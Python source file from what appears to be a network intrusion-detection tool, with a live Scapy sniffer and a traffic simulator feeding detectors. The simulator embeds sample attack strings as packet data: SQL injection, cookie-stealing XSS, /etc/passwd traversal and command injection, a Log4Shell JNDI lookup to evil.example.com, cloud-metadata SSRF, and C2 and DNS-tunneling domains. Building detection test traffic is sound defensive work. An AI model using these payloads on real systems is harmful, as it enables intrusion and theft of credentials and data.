"""Packet capture: live Scapy sniffer + multi-attack simulation + dynamic connect manager."""
from __future__ import annotations
import os
import random
import socket
import struct
import threading
import time
from collections import deque
from typing import Callable

from backend.capture.packet_parser import ParsedPacket

PacketHandler = Callable[[ParsedPacket | dict], None]


class PacketCapture:
    def __init__(self, interface: str = "lo", mode: str = "simulate",
                 bpf_filter: str = "", intensity: str = "medium",
                 attacks: list[str] | None = None):
        self.interface = interface
        self.mode = mode  # simulate | live | pcap | agent
        self.bpf_filter = bpf_filter
        self.promiscuous = False
        self.intensity = intensity  # low | medium | high | stress
        self.attacks = attacks or ["all"]
        self.pcap_file = ""

        self.handlers: list[PacketHandler] = []
        self._running = False
        self._thread: threading.Thread | None = None
        self.stats = {"packets": 0, "pps": 0, "dropped": 0}
        self._pps_window: deque = deque(maxlen=5000)
        self.current_source_info = "Simulator (Synthetic 14-Class Traffic)"
        self._active_pcap_replayer = None

    def add_handler(self, fn: PacketHandler) -> None:
        self.handlers.append(fn)

    def _emit(self, pkt: dict | ParsedPacket) -> None:
        self.stats["packets"] += 1
        self._pps_window.append(time.time())
        for h in self.handlers:
            try:
                h(pkt)
            except Exception:
                pass

    # ── Simulator Logic ─────────────────────────────────
    _hosts = ["192.168.1.10", "192.168.1.20", "192.168.1.30", "10.0.0.5", "10.0.0.8"]
    _services = [80, 443, 22, 53, 3306, 21, 3389]
    _c2_domains = ["beacon.evil.example.com", "malicious.example.com"]

    def _attack_enabled(self, category: str) -> bool:
        if not self.attacks or "all" in self.attacks:
            return True
        return category in self.attacks

    def _random_packet(self) -> dict:
        r = random.random()
        H = self._hosts

        # Reconnaissance / Scans
        if self._attack_enabled("scans"):
            if r < 0.030:
                return {"src_ip": "10.0.0.99", "dst_ip": random.choice(H),
                        "src_port": random.randint(1024, 65535), "dst_port": random.randint(1, 2048),
                        "protocol": "TCP", "length": 60, "flags": "S", "payload_len": 0,
                        "dns_query": "", "http_payload": ""}
            if r < 0.045:
                return {"src_ip": "10.0.0.99", "dst_ip": random.choice(H),
                        "src_port": random.randint(1024, 65535), "dst_port": random.randint(1, 1024),
                        "protocol": "TCP", "length": 54, "flags": random.choice(["", "FPU"]),
                        "payload_len": 0, "dns_query": "", "http_payload": ""}

        # Floods / DoS
        if self._attack_enabled("floods"):
            if r < 0.065:
                return {"src_ip": f"172.16.0.{random.randint(2, 60)}", "dst_ip": H[0],
                        "src_port": random.randint(1024, 65535), "dst_port": 80,
                        "protocol": "TCP", "length": 60, "flags": "S", "payload_len": 0,
                        "dns_query": "", "http_payload": ""}
            if r < 0.080:
                return {"src_ip": f"172.16.1.{random.randint(2, 60)}", "dst_ip": H[1],
                        "src_port": random.randint(1024, 65535), "dst_port": 53 + random.randint(1, 500),
                        "protocol": "UDP", "length": random.randint(64, 512), "flags": "",
                        "payload_len": 100, "dns_query": "", "http_payload": ""}
            if r < 0.088:
                return {"src_ip": f"172.16.2.{random.randint(2, 60)}", "dst_ip": H[2],
                        "src_port": 0, "dst_port": 0, "protocol": "ICMP", "length": 98,
                        "flags": "", "payload_len": 56, "dns_query": "", "http_payload": ""}

        # Brute Force
        if self._attack_enabled("brute"):
            if r < 0.100:
                return {"src_ip": "10.0.0.77", "dst_ip": random.choice(H),
                        "src_port": random.randint(1024, 65535), "dst_port": 22,
                        "protocol": "TCP", "length": 90, "flags": "PA", "payload_len": 40,
                        "dns_query": "", "http_payload": "SSH Failed password for root"}
            if r < 0.108:
                return {"src_ip": "10.0.0.78", "dst_ip": random.choice(H),
                        "src_port": random.randint(1024, 65535), "dst_port": 21,
                        "protocol": "TCP", "length": 90, "flags": "PA", "payload_len": 40,
                        "dns_query": "", "http_payload": "FTP login failed 530"}
            if r < 0.116:
                return {"src_ip": "10.0.0.79", "dst_ip": random.choice(H),
                        "src_port": random.randint(1024, 65535), "dst_port": 80,
                        "protocol": "TCP", "length": 300, "flags": "PA", "payload_len": 220,
                        "dns_query": "", "http_payload": "POST /login 401 authentication failure"}
            if r < 0.122:
                return {"src_ip": "10.0.0.80", "dst_ip": random.choice(H),
                        "src_port": random.randint(1024, 65535), "dst_port": 3389,
                        "protocol": "TCP", "length": 110, "flags": "PA", "payload_len": 50,
                        "dns_query": "", "http_payload": "RDP login failed 401 authentication failure"}
            if r < 0.128:
                return {"src_ip": f"45.148.10.{random.randint(2, 200)}", "dst_ip": random.choice(H),
                        "src_port": random.randint(1024, 65535),
                        "dst_port": random.choice([23, 2323]),
                        "protocol": "TCP", "length": 80, "flags": "PA", "payload_len": 30,
                        "dns_query": "", "http_payload": "login failed password incorrect"}

        # Web & Injections
        if self._attack_enabled("web"):
            if r < 0.136:
                return {"src_ip": f"45.33.9.{random.randint(2, 200)}", "dst_ip": random.choice(H),
                        "src_port": random.randint(1024, 65535), "dst_port": 80,
                        "protocol": "TCP", "length": 500, "flags": "PA", "payload_len": 400,
                        "dns_query": "", "http_payload": "GET /product?id=1' UNION SELECT password FROM users-- "}
            if r < 0.142:
                return {"src_ip": f"45.33.9.{random.randint(2, 200)}", "dst_ip": random.choice(H),
                        "src_port": random.randint(1024, 65535), "dst_port": 80,
                        "protocol": "TCP", "length": 480, "flags": "PA", "payload_len": 380,
                        "dns_query": "", "http_payload": "GET /search?q=<script>document.cookie</script>"}
            if r < 0.148:
                return {"src_ip": f"45.33.9.{random.randint(2, 200)}", "dst_ip": random.choice(H),
                        "src_port": random.randint(1024, 65535), "dst_port": 80,
                        "protocol": "TCP", "length": 420, "flags": "PA", "payload_len": 320,
                        "dns_query": "", "http_payload": "GET /../../etc/passwd HTTP/1.1"}
            if r < 0.154:
                return {"src_ip": f"45.33.9.{random.randint(2, 200)}", "dst_ip": random.choice(H),
                        "src_port": random.randint(1024, 65535), "dst_port": 8080,
                        "protocol": "TCP", "length": 450, "flags": "PA", "payload_len": 350,
                        "dns_query": "", "http_payload": "GET /?x=${jndi:ldap://evil.example.com/a}"}
            if r < 0.160:
                return {"src_ip": f"45.33.9.{random.randint(2, 200)}", "dst_ip": random.choice(H),
                        "src_port": random.randint(1024, 65535), "dst_port": 80,
                        "protocol": "TCP", "length": 430, "flags": "PA", "payload_len": 330,
                        "dns_query": "", "http_payload": "GET /ping?ip=8.8.8.8;cat /etc/passwd"}
            if r < 0.165:
                return {"src_ip": f"45.33.9.{random.randint(2, 200)}", "dst_ip": random.choice(H),
                        "src_port": random.randint(1024, 65535), "dst_port": 80,
                        "protocol": "TCP", "length": 400, "flags": "PA", "payload_len": 300,
                        "dns_query": "", "http_payload": "GET /fetch?url=http://169.254.169.254/latest/meta-data/"}

        # C2, DNS Tunneling & Cryptominer
        if self._attack_enabled("c2"):
            if r < 0.171:
                big = r > 0.168
                q = ("x" * random.randint(120, 160) if big else "x" * random.randint(55, 80)) + ".evil.example.com"
                return {"src_ip": random.choice(H), "dst_ip": "8.8.8.8",
                        "src_port": random.randint(1024, 65535), "dst_port": 53,
                        "protocol": "UDP", "length": 150, "flags": "", "payload_len": 110,
                        "dns_query": q, "http_payload": ""}
            if r < 0.176:
                return {"src_ip": random.choice(H), "dst_ip": "93.184.216.34",
                        "src_port": random.randint(1024, 65535), "dst_port": 443,
                        "protocol": "TCP", "length": 180, "flags": "PA", "payload_len": 120,
                        "dns_query": random.choice(self._c2_domains), "http_payload": ""}
            if r < 0.180:
                return {"src_ip": "192.168.1.66", "dst_ip": "192.168.1.1",
                        "src_port": 0, "dst_port": 0, "protocol": "ARP", "length": 42,
                        "flags": "", "payload_len": 0, "dns_query": "", "http_payload": ""}
            if r < 0.185:
                return {"src_ip": random.choice(H), "dst_ip": "203.0.113.77",
                        "src_port": random.randint(1024, 65535),
                        "dst_port": random.choice([3333, 4444, 5555]),
                        "protocol": "TCP", "length": 260, "flags": "PA", "payload_len": 180,
                        "dns_query": "",
                        "http_payload": '{"method":"mining.subscribe","params":["xmrig/6.0"]}'}

        # Exfiltration
        if self._attack_enabled("exfil"):
            if r < 0.190:
                return {"src_ip": random.choice(H), "dst_ip": "203.0.113.9",
                        "src_port": random.randint(1024, 65535), "dst_port": 443,
                        "protocol": "TCP", "length": 1500, "flags": "PA", "payload_len": 1440,
                        "dns_query": "", "http_payload": ""}

        # Benign baseline traffic
        return {"src_ip": random.choice(H),
                "dst_ip": random.choice(H + ["8.8.8.8", "1.1.1.1"]),
                "src_port": random.randint(1024, 65535),
                "dst_port": random.choice(self._services),
                "protocol": random.choice(["TCP", "TCP", "TCP", "UDP", "UDP", "ICMP", "ARP"]),
                "length": random.randint(60, 1500), "flags": "PA",
                "payload_len": random.randint(0, 1400),
                "dns_query": "", "http_payload": ""}

    def _burst_campaign(self) -> list[dict]:
        H = self._hosts
        choices = []
        if self._attack_enabled("floods"):
            choices += ["slowloris", "ntp_amp"]
        if self._attack_enabled("scans"):
            choices += ["ping_sweep", "horizontal"]
        if self._attack_enabled("brute"):
            choices += ["spray"]
        if self._attack_enabled("c2") or self._attack_enabled("all"):
            choices += ["smb"]

        if not choices:
            return []

        c = random.choice(choices)
        pkts: list[dict] = []
        if c == "smb":
            src = "10.0.0.66"
            for _ in range(25):
                pkts.append({"src_ip": src, "dst_ip": random.choice(H),
                             "src_port": random.randint(1024, 65535), "dst_port": 445,
                             "protocol": "TCP", "length": 60, "flags": "S",
                             "payload_len": 0, "dns_query": "", "http_payload": ""})
        elif c == "slowloris":
            src = f"45.33.10.{random.randint(2, 200)}"
            for _ in range(60):
                pkts.append({"src_ip": src, "dst_ip": H[0],
                             "src_port": random.randint(1024, 65535), "dst_port": 80,
                             "protocol": "TCP", "length": 150, "flags": "PA",
                             "payload_len": 90, "dns_query": "",
                             "http_payload": "POST /form Content-Length: 10000"})
        elif c == "ntp_amp":
            for _ in range(60):
                pkts.append({"src_ip": f"172.16.3.{random.randint(2, 60)}", "dst_ip": H[1],
                             "src_port": random.randint(1024, 65535), "dst_port": 123,
                             "protocol": "UDP", "length": 90, "flags": "",
                             "payload_len": 48, "dns_query": "", "http_payload": ""})
        elif c == "ping_sweep":
            src = "10.0.0.70"
            for h in H * 3:
                pkts.append({"src_ip": src, "dst_ip": h, "src_port": 0,
                             "dst_port": 0, "protocol": "ICMP", "length": 98,
                             "flags": "", "payload_len": 56,
                             "dns_query": "", "http_payload": ""})
        elif c == "horizontal":
            src = "10.0.0.71"
            for h in H * 3:
                pkts.append({"src_ip": src, "dst_ip": h,
                             "src_port": random.randint(1024, 65535), "dst_port": 6379,
                             "protocol": "TCP", "length": 60, "flags": "S",
                             "payload_len": 0, "dns_query": "", "http_payload": ""})
        else:  # spray
            src = "10.0.0.72"
            for h in H * 2:
                pkts.append({"src_ip": src, "dst_ip": h,
                             "src_port": random.randint(1024, 65535), "dst_port": 22,
                             "protocol": "TCP", "length": 90, "flags": "PA",
                             "payload_len": 40, "dns_query": "",
                             "http_payload": "SSH Failed password for admin"})
        return pkts

    def _simulate_loop(self) -> None:
        # Intensity parameters: (batch_min, batch_max, sleep_interval)
        intensity_map = {
            "low": (3, 8, 0.40),        # ~15 pps
            "medium": (8, 25, 0.15),     # ~60-100 pps
            "high": (40, 90, 0.08),      # ~400 pps
            "stress": (120, 250, 0.03),  # ~1500+ pps
        }
        b_min, b_max, s_time = intensity_map.get(self.intensity, (8, 25, 0.15))

        while self._running:
            if random.random() < 0.20:
                for pkt in self._burst_campaign():
                    if not self._running:
                        break
                    self._emit(pkt)

            for _ in range(random.randint(b_min, b_max)):
                if not self._running:
                    break
                self._emit(self._random_packet())

            time.sleep(s_time)

    # ── Live Sniffer Logic ──────────────────────────────
    def _live_loop(self) -> None:
        try:
            from scapy.all import sniff
            from backend.capture.packet_parser import parse_raw, dict_from_parsed
        except ImportError:
            self._simulate_loop()
            return

        def _cb(pkt):
            p = parse_raw(pkt)
            if p is not None:
                self._emit(dict_from_parsed(p))

        sniff_kwargs = {
            "iface": self.interface,
            "prn": _cb,
            "store": False,
            "stop_filter": lambda _: not self._running,
        }
        if self.bpf_filter:
            sniff_kwargs["filter"] = self.bpf_filter
        if self.promiscuous:
            sniff_kwargs["promisc"] = True

        try:
            sniff(**sniff_kwargs)
        except PermissionError:
            self.stats["error"] = f"Permission denied opening raw socket on '{self.interface}'. Run with sudo or grant CAP_NET_RAW."
        except Exception as e:
            self.stats["error"] = str(e)

    def _agent_loop(self) -> None:
        while self._running:
            time.sleep(1.0)

    # ── Multi-Computer Remote Agent Injection ───────────
    def ingest_remote_packet(self, pkt: dict, agent_id: str = "", site: str = "") -> None:
        """Called when a remote computer agent pushes a packet or flow event."""
        if not self._running:
            return
        pkt["_agent_id"] = agent_id
        pkt["_site"] = site
        self._emit(pkt)

    # ── Lifecycle Controls ──────────────────────────────
    def start(self) -> None:
        if self._running:
            return
        self._running = True

        if self.mode == "live":
            self.current_source_info = f"Local Interface: {self.interface}"
            target = self._live_loop
        elif self.mode == "agent":
            self.current_source_info = "Remote Agents (Multi-Computer Mode)"
            # Agent mode runs passively waiting for incoming /ws/agent streams
            target = self._agent_loop
        else:
            self.current_source_info = f"Simulator: {self.intensity.title()} ({', '.join(self.attacks)})"
            target = self._simulate_loop

        self._thread = threading.Thread(target=target, daemon=True)
        self._thread.start()

    def stop(self) -> None:
        self._running = False
        if self._active_pcap_replayer:
            self._active_pcap_replayer.stop()

    def switch_mode(self, mode: str, **kwargs) -> dict:
        """Switch ingestion mode dynamically without restarting server."""
        self.stop()
        time.sleep(0.1)

        self.mode = mode
        if "interface" in kwargs:
            self.interface = kwargs["interface"]
        if "bpf_filter" in kwargs:
            self.bpf_filter = kwargs["bpf_filter"]
        if "promiscuous" in kwargs:
            self.promiscuous = bool(kwargs["promiscuous"])
        if "intensity" in kwargs:
            self.intensity = kwargs["intensity"]
        if "attacks" in kwargs:
            self.attacks = kwargs["attacks"]
        if "pcap_file" in kwargs:
            self.pcap_file = kwargs["pcap_file"]

        if mode == "pcap" and self.pcap_file:
            from backend.capture.pcap_replayer import PcapReplayer
            speed = kwargs.get("speed", "instant")
            self.current_source_info = f"PCAP Replay: {os.path.basename(self.pcap_file)} ({speed})"
            self._running = True
            self._active_pcap_replayer = PcapReplayer(
                filepath=self.pcap_file,
                handler=self._emit,
                speed=speed,
                on_progress=kwargs.get("on_progress")
            )
            self._active_pcap_replayer.start()
        else:
            self.start()

        return self.get_status()

    def current_pps(self) -> float:
        now = time.time()
        while self._pps_window and now - self._pps_window[0] > 1.0:
            self._pps_window.popleft()
        return float(len(self._pps_window))

    def get_status(self) -> dict:
        return {
            "mode": self.mode,
            "running": self._running,
            "interface": self.interface,
            "intensity": self.intensity,
            "attacks": self.attacks,
            "bpf_filter": self.bpf_filter,
            "promiscuous": self.promiscuous,
            "pps": round(self.current_pps(), 1),
            "packets": self.stats["packets"],
            "dropped": self.stats.get("dropped", 0),
            "source_info": self.current_source_info,
        }

    # ── Host Interface Inspection ───────────────────────
    @staticmethod
    def get_host_interfaces() -> list[dict]:
        """Inspect host network interfaces using Linux sysfs and sockets."""
        interfaces: list[dict] = []
        net_dir = "/sys/class/net"

        if os.path.exists(net_dir):
            for name in sorted(os.listdir(net_dir)):
                ifpath = os.path.join(net_dir, name)
                # Operstate
                operstate = "unknown"
                try:
                    with open(os.path.join(ifpath, "operstate"), "r") as f:
                        operstate = f.read().strip().upper()
                except Exception:
                    pass

                # MAC Address
                mac = ""
                try:
                    with open(os.path.join(ifpath, "address"), "r") as f:
                        mac = f.read().strip()
                except Exception:
                    pass

                # Packet counters
                rx_pkts = 0
                try:
                    with open(os.path.join(ifpath, "statistics", "rx_packets"), "r") as f:
                        rx_pkts = int(f.read().strip())
                except Exception:
                    pass

                # IP Address resolution
                ip = ""
                s = None
                try:
                    import fcntl
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    ip = socket.inet_ntoa(
                        fcntl.ioctl(
                            s.fileno(),
                            0x8915,  # SIOCGIFADDR
                            struct.pack("256s", name[:15].encode("utf-8"))
                        )[20:24]
                    )
                except Exception:
                    ip = "127.0.0.1" if name == "lo" else ""
                finally:
                    if s:
                        s.close()

                interfaces.append({
                    "name": name,
                    "ip": ip,
                    "mac": mac,
                    "status": operstate,
                    "is_up": operstate in ("UP", "UNKNOWN"),
                    "is_loopback": name == "lo",
                    "packets_seen": rx_pkts
                })

        # Fallback to Scapy if sysfs was empty
        if not interfaces:
            try:
                from scapy.all import get_if_list, get_if_addr
                for iface in get_if_list():
                    addr = ""
                    try:
                        addr = get_if_addr(iface)
                    except Exception:
                        pass
                    interfaces.append({
                        "name": iface,
                        "ip": addr,
                        "mac": "",
                        "status": "UP",
                        "is_up": True,
                        "is_loopback": iface in ("lo", "lo0"),
                        "packets_seen": 0
                    })
            except Exception:
                interfaces.append({
                    "name": "lo", "ip": "127.0.0.1", "mac": "00:00:00:00:00:00",
                    "status": "UP", "is_up": True, "is_loopback": True, "packets_seen": 0
                })

        return interfaces

    @staticmethod
    def test_interface_traffic(interface: str, duration: int = 10) -> dict:
        """Sniff packets for up to duration seconds to test SPAN/TAP or local link."""
        try:
            from scapy.all import sniff
        except ImportError:
            return {
                "ok": False,
                "packets_seen": 0,
                "error": "Scapy library not installed. Install requirements first.",
                "fix": "pip install scapy"
            }

        seen_packets = []
        protocols_seen = set()

        def _test_cb(pkt):
            seen_packets.append(pkt)
            if pkt.haslayer("IP"):
                protocols_seen.add(pkt.getlayer("IP").proto)

        try:
            sniff(iface=interface, prn=_test_cb, timeout=duration, store=False)
        except PermissionError:
            return {
                "ok": False,
                "packets_seen": 0,
                "error": f"Permission denied opening raw socket on '{interface}'.",
                "fix": f"Run with sudo or execute: sudo setcap cap_net_raw,cap_net_admin=eip $(which python3)"
            }
        except Exception as e:
            return {
                "ok": False,
                "packets_seen": 0,
                "error": f"Sniffer error on '{interface}': {e}",
                "fix": f"Check that interface '{interface}' exists, is up (`ip link set {interface} up`), and cable is connected."
            }

        count = len(seen_packets)
        if count == 0:
            return {
                "ok": False,
                "packets_seen": 0,
                "error": f"No packets detected on '{interface}' in {duration} seconds.",
                "fix": "1. Verify network cable is connected.\n2. For SPAN/mirror ports, ensure source switch port has active traffic.\n3. Verify promiscuous mode: sudo ip link set " + interface + " promisc on\n4. Disable local firewall dropping SPAN frames."
            }

        return {
            "ok": True,
            "packets_seen": count,
            "rate_pps": round(count / max(1, duration), 1),
            "message": f"Success: {count} packets captured on '{interface}' across {len(protocols_seen)} protocols!"
        }
